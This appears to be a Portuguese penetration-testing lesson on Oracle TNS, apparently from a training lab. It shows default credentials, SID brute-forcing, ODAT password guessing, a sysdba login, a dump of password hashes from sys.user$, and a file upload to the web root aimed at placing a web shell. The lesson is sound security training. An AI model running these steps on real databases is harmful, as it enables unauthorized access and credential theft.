O `Oracle Transparent Network Substrate` (O servidor `TNS` ) é um protocolo de comunicação que facilita a comunicação entre bancos de dados e aplicativos Oracle através de redes. Introduzido inicialmente como parte do conjunto de software [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) , o TNS suporta vários protocolos de rede entre bancos de dados Oracle e aplicativos clientes, como pilhas de protocolo `IPX/SPX` e `TCP/IP`. Como resultado, tornou-se uma solução preferida para gerenciar bancos de dados grandes e complexos nos setores de saúde, finanças e varejo. Além disso, seu mecanismo de criptografia embutido garante a segurança dos dados transmitidos, tornando-o uma solução ideal para ambientes corporativos em que a segurança dos dados é fundamental.

Com o tempo, o TNS foi atualizado para oferecer suporte a tecnologias mais recentes, incluindo `IPv6` e criptografia `SSL/TLS` que a torna mais adequada para os seguintes fins:

- Resolução de nome
- Gerenciamento de conexão
- Balanceamento de carga
- Segurança

Além disso, permite a criptografia entre a comunicação do cliente e do servidor através de uma camada adicional de segurança na camada de protocolo TCP / IP. Esse recurso ajuda a proteger a arquitetura do banco de dados contra acessos não autorizados ou ataques que tentam comprometer os dados no tráfego da rede. Além disso, fornece ferramentas e recursos avançados para administradores e desenvolvedores de banco de dados, pois oferece ferramentas abrangentes de monitoramento e análise de desempenho, recursos de relatório e registro de erros, gerenciamento de carga de trabalho e tolerância a falhas através de serviços de banco de dados.

## Configuração padrão

A configuração padrão do servidor Oracle TNS varia de acordo com a versão e edição do software Oracle instalado. No entanto, algumas configurações comuns geralmente são configuradas por padrão no Oracle TNS. Por padrão, o ouvinte ouve as conexões recebidas na porta `TCP/1521`. No entanto, essa porta padrão pode ser alterada durante a instalação ou posteriormente no arquivo de configuração. O listener TNS está configurado para suportar vários protocolos de rede, incluindo `TCP/IP`, `UDP`, `IPX/SPX`, e `AppleTalk`. O listener também pode suportar várias interfaces de rede e ouvir em endereços IP específicos ou em todas as interfaces de rede disponíveis. Por padrão, o Oracle TNS pode ser gerenciado remotamente `Oracle 8i`/`9i` mas não no Oracle 10g / 11g.

A configuração padrão do ouvinte TNS também inclui alguns recursos básicos de segurança. Por exemplo, o ouvinte aceita apenas conexões de hosts autorizados e executa autenticação básica usando uma combinação de nomes de host, endereços IP e nomes de usuário e senhas. Além disso, o ouvinte usará o Oracle Net Services para criptografar a comunicação entre o cliente e o servidor. Os arquivos de configuração do Oracle TNS são chamados `tnsnames.ora` e `listener.ora` e geralmente estão localizados no diretório `ORACLE_HOME/network/admin`. O arquivo de texto sem formatação contém informações de configuração para instâncias do banco de dados Oracle e outros serviços de rede que usam o protocolo TNS.

O Oracle TNS é frequentemente usado com outros serviços Oracle, como Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, servidores da web e muito mais. Houve muitas alterações na instalação padrão dos serviços Oracle. Por exemplo, o Oracle 9 tem uma senha padrão, `CHANGE_ON_INSTALL`, enquanto o Oracle 10 não possui um conjunto de senhas padrão. O serviço Oracle DBSNMP também usa uma senha padrão, `dbsnmp` que devemos lembrar quando nos depararmos com este. Outro exemplo seria que muitas organizações ainda usam o serviço `finger` junto com a Oracle, que pode colocar em risco o serviço da Oracle e torná-lo vulnerável quando tivermos o conhecimento necessário de um diretório inicial.

Cada banco de dados ou serviço tem uma entrada exclusiva no arquivo [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007), contendo as informações necessárias para os clientes se conectarem ao serviço. A entrada consiste em um nome para o serviço, o local da rede do serviço e o nome do banco de dados ou serviço que os clientes devem usar ao se conectarem ao serviço. Por exemplo, um simples `tnsnames.ora` o arquivo pode ficar assim:

#### Tnsnames.ora

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

Aqui podemos ver um serviço chamado `ORCL`, que está ouvindo na porta `TCP/1521` no endereço IP `10.129.11.102`. Os clientes devem usar o nome do serviço `orcl` ao conectar-se ao serviço. No entanto, o arquivo tnsnames.ora pode conter muitas dessas entradas para diferentes bancos de dados e serviços. As entradas também podem incluir informações adicionais, como detalhes de autenticação, configurações de pool de conexão e configurações de balanceamento de carga.

Por outro lado, o arquivo `listener.ora` é um arquivo de configuração do lado do servidor que define as propriedades e os parâmetros do processo do ouvinte, responsável por receber solicitações de clientes recebidas e encaminhá-las para a instância apropriada do banco de dados Oracle.

#### Listener.ora

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

Em suma, o software Oracle Net Services do lado do cliente usa o arquivo `tnsnames.ora`  para resolver nomes de serviço em endereços de rede, enquanto o processo do ouvinte usa `listener.ora` arquivo para determinar os serviços que ele deve ouvir e o comportamento do ouvinte.

Os bancos de dados Oracle podem ser protegidos usando a chamada Lista de Exclusão PL / SQL (`PlsqlExclusionList`). É um arquivo de texto criado pelo usuário que precisa ser colocado no diretório `$ORACLE_HOME/sqldeveloper` e contém os nomes dos pacotes ou tipos de PL / SQL que devem ser excluídos da execução. Depois que o arquivo da Lista de Exclusão PL / SQL é criado, ele pode ser carregado na instância do banco de dados. Ele serve como uma lista negra que não pode ser acessada através do Oracle Application Server.

|**Configurando**|**Descrição**|
|---|---|
|`DESCRIPTION`|Um descritor que fornece um nome para o banco de dados e seu tipo de conexão.|
|`ADDRESS`|O endereço de rede do banco de dados, que inclui o nome do host e o número da porta.|
|`PROTOCOL`|O protocolo de rede usado para comunicação com o servidor|
|`PORT`|O número da porta usado para comunicação com o servidor|
|`CONNECT_DATA`|Especifica os atributos da conexão, como o nome do serviço ou SID, protocolo e identificador de instância do banco de dados.|
|`INSTANCE_NAME`|O nome da instância do banco de dados que o cliente deseja conectar.|
|`SERVICE_NAME`|O nome do serviço ao qual o cliente deseja se conectar.|
|`SERVER`|O tipo de servidor usado para a conexão do banco de dados, como dedicado ou compartilhado.|
|`USER`|O nome de usuário usado para autenticar com o servidor de banco de dados.|
|`PASSWORD`|A senha usada para autenticar com o servidor de banco de dados.|
|`SECURITY`|O tipo de segurança para a conexão.|
|`VALIDATE_CERT`|Se deve validar o certificado usando SSL / TLS.|
|`SSL_VERSION`|A versão do SSL / TLS a ser usada para a conexão.|
|`CONNECT_TIMEOUT`|O prazo em segundos para o cliente estabelecer uma conexão com o banco de dados.|
|`RECEIVE_TIMEOUT`|O prazo em segundos para o cliente receber uma resposta do banco de dados.|
|`SEND_TIMEOUT`|O prazo em segundos para o cliente enviar uma solicitação ao banco de dados.|
|`SQLNET.EXPIRE_TIME`|O prazo em segundos para o cliente detectar uma conexão falhou.|
|`TRACE_LEVEL`|O nível de rastreamento para a conexão do banco de dados.|
|`TRACE_DIRECTORY`|O diretório em que os arquivos de rastreamento estão armazenados.|
|`TRACE_FILE_NAME`|O nome do arquivo de rastreamento.|
|`LOG_FILE`|O arquivo em que as informações do log estão armazenadas.|

Antes de podermos enumerar o ouvinte do TNS e interagir com ele, precisamos baixar alguns pacotes e ferramentas para o nosso `Pwnbox` por exemplo, caso ainda não os tenha. Aqui está um script Bash que faz tudo isso:

#### Oracle-Tools-setup.sh

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien python3-pip -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
sudo submodule update
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```

Depois disso, podemos tentar determinar se a instalação foi bem-sucedida executando o seguinte comando:

```shell-session
casluxd@htb[/htb]$ ./odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
```

Ferramenta de ataque ao banco de dados Oracle (`ODAT`) é uma ferramenta de teste de penetração de código aberto escrita em Python e projetada para enumerar e explorar vulnerabilidades em bancos de dados Oracle. Ele pode ser usado para identificar e explorar várias falhas de segurança nos bancos de dados Oracle, incluindo injeção de SQL, execução remota de código e escalonamento de privilégios.

Vamos agora usar `nmap` para verificar a porta padrão do ouvinte Oracle TNS.

```shell-session
casluxd@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

Podemos ver que a porta está aberta e o serviço está em execução. No Oracle RDBMS, um identificador de sistema (`SID`) é um nome exclusivo que identifica uma instância específica do banco de dados. Ele pode ter várias instâncias, cada uma com seu próprio ID do sistema. Uma instância é um conjunto de processos e estruturas de memória que interagem para gerenciar os dados do banco de dados. Quando um cliente se conecta a um banco de dados Oracle, ele especifica os bancos de dados `SID` junto com sua sequência de conexão. O cliente usa esse SID para identificar a instância do banco de dados à qual deseja se conectar. Suponha que o cliente não especifique um SID. Então, o valor padrão definido no `tnsnames.ora` arquivo é usado.

Os SIDs são uma parte essencial do processo de conexão, pois identifica a instância específica do banco de dados ao qual o cliente deseja se conectar. Se o cliente especificar um SID incorreto, a tentativa de conexão falhará. Os administradores de banco de dados podem usar o SID para monitorar e gerenciar as instâncias individuais de um banco de dados. Por exemplo, eles podem iniciar, parar ou reiniciar uma instância, ajustar sua alocação de memória ou outros parâmetros de configuração e monitorar seu desempenho usando ferramentas como o Oracle Enterprise Manager.

Existem várias maneiras de enumerar, ou melhor, adivinhar os SIDs. Portanto, podemos usar ferramentas como `nmap`, `hydra`, `odat`, e outros. Vamos usar `nmap` primeiro.

```shell-session
casluxd@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

Nós podemos usar a ferramenta `odat.py` para executar uma variedade de verificações para enumerar e coletar informações sobre os serviços de banco de dados Oracle e seus componentes. Essas verificações podem recuperar nomes de banco de dados, versões, processos em execução, contas de usuário, vulnerabilidades, configurações incorretas etc. Vamos usar o `all` opção e tente todos os módulos do `odat.py` ferramenta.

```shell-session
casluxd@htb[/htb]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

Neste exemplo, encontramos credenciais válidas para o usuário `scott` e sua senha `tiger`. Depois disso, podemos usar a ferramenta `sqlplus` para conectar-se ao banco de dados Oracle e interagir com ele.

```shell-session
casluxd@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE;

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

Se você encontrar o seguinte erro `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, execute o abaixo, retirado de [aqui](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

```shell-session
casluxd@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

Existem muitos [Comandos SQLplus](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) que podemos usar para enumerar o banco de dados manualmente. Por exemplo, podemos listar todas as tabelas disponíveis no banco de dados atual ou mostrar os privilégios do usuário atual da seguinte maneira:

```shell-session
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Aqui, o usuário `scott` não tem privilégios administrativos. No entanto, podemos tentar usar essa conta para fazer login como administrador do banco de dados do sistema (`sysdba`), dando-nos privilégios mais altos. Isso é possível quando o usuário `scott` possui os privilégios apropriados normalmente concedidos pelo administrador do banco de dados ou usados pelo próprio administrador.

```shell-session
casluxd@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

Podemos seguir muitas abordagens quando tivermos acesso a um banco de dados Oracle. Depende muito das informações que temos e de toda a configuração. No entanto, não podemos adicionar novos usuários ou fazer modificações. A partir deste ponto, poderíamos recuperar os hashes de senha dos `sys.user$` e tente decifrá-los offline. A consulta para isso seria semelhante à seguinte:

```shell-session
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

Outra opção é fazer upload de um shell da web para o destino. No entanto, isso requer que o servidor execute um servidor da web e precisamos saber o local exato do diretório raiz do servidor da web. No entanto, se soubermos com que tipo de sistema estamos lidando, podemos tentar os caminhos padrão, que são:

|**OS**|**Caminho**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

Primeiro, tentar nossa abordagem de exploração com arquivos que não parecem perigosos para os sistemas de detecção / prevenção de antivírus ou intrusão é sempre importante. Portanto, criamos um arquivo de texto com uma sequência e o usamos para fazer upload para o sistema de destino.

#### Oracle RDBMS - Upload de arquivo

```shell-session
casluxd@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
casluxd@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finalmente, podemos testar se a abordagem de upload de arquivos funcionou com `curl`. Portanto, usaremos um `GET http://<IP>` solicitação ou podemos visitar através do navegador.

```shell-session
casluxd@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```


## Resumo

O protocolo Oracle TNS (Transparent Network Substrate) é um componente fundamental da arquitetura de rede da Oracle, usado para estabelecer a comunicação entre os clientes Oracle e os bancos de dados Oracle. Ele permite que os clientes se conectem aos bancos de dados Oracle por meio de uma rede, independentemente do sistema operacional ou do protocolo de rede subjacente.

O TNS é uma camada de software intermediária que atua como um serviço de rede transparente para os clientes e os bancos de dados Oracle. Ele permite que os clientes se comuniquem com o banco de dados Oracle usando identificadores de serviço, que são mapeados para endereços de rede reais por meio de um arquivo de configuração chamado arquivo de perfil TNS (TNSNAMES.ORA).

Quando um cliente Oracle deseja se conectar a um banco de dados, ele usa o TNS para resolver o nome do serviço especificado pelo cliente em um endereço de rede real. O TNS usa o arquivo de perfil TNS (TNSNAMES.ORA) para localizar as informações de conexão necessárias, como o nome do banco de dados, o endereço IP do servidor, o número da porta e outros parâmetros de configuração. Com base nessas informações, o TNS estabelece uma conexão com o banco de dados Oracle.

Além disso, o TNS fornece recursos avançados, como a capacidade de balanceamento de carga entre vários servidores de banco de dados, failover automático para garantir a disponibilidade contínua do banco de dados e criptografia de dados para garantir a segurança da comunicação.

Em resumo, o protocolo Oracle TNS é um componente essencial que permite a comunicação entre clientes Oracle e bancos de dados Oracle por meio de uma rede, facilitando a resolução de nomes de serviço e fornecendo recursos avançados, como balanceamento de carga e failover automático.

### Então você não realiza a comunicação cliente-banco diretamente e sim cliente-tns que é responsável por criar essa conexão com o banco de dados, certo?

Isso mesmo. O protocolo Oracle TNS atua como uma camada intermediária entre o cliente e o banco de dados Oracle. Em vez de o cliente se comunicar diretamente com o banco de dados, ele se comunica com o TNS, que por sua vez estabelece a conexão com o banco de dados em nome do cliente. O TNS lida com a resolução de nomes de serviço, mapeando-os para os endereços de rede reais dos bancos de dados, e realiza a configuração e gerenciamento da conexão.

Essa abordagem traz benefícios, pois permite que o cliente se concentre na lógica de negócios e abstrai os detalhes de rede e localização do banco de dados. Além disso, o TNS oferece recursos avançados, como balanceamento de carga e failover automático, que melhoram a disponibilidade e o desempenho do sistema.

Em resumo, o cliente se comunica com o TNS, que atua como uma camada intermediária para estabelecer a conexão com o banco de dados Oracle. Essa separação de responsabilidades permite maior flexibilidade e recursos adicionais na comunicação entre o cliente e o banco de dados.

